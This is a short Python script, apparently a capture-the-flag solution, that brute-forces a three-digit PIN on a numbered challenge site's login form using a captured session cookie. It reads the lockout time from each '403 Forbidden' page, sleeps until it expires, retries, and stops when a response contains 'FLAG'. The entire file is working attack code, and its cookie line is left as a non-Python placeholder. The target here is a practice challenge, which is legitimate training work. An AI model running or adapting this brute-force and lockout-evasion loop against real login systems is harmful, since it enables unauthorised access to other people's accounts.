import re
import time
import requests

# Usage: add your cookie, set challenge number, highest number, and adjust the formatting for correct length on line 13

challenge_number = 104
cookie = // Capture valid cookie //
highest_num = 999

for i in range(highest_num):

    pin = '{0:03}'.format(i)
    request = requests.post("http://" + str(challenge_number) + ".cybertrial.co.uk/login", data={"formgo": "1", "pin": pin}, cookies={"PHPSESSID": cookie})

    if(request.text.__contains__("403 Forbidden")):
        print("Waiting " + re.search("\d+(?=<\/span> seconds)", request.text).group(0) + " seconds")
        time.sleep(int(re.search("\d+(?=<\/span> seconds)", request.text).group(0)) + 1)
        request = requests.post("http://" + str(challenge_number) + ".cybertrial.co.uk/login",
                                data={"formgo": "1", "pin": pin}, cookies={"PHPSESSID": cookie})

    print(pin)

    if(request.text.__contains__("FLAG")):
        print(request.text)
        print(pin)
        exit(-1)
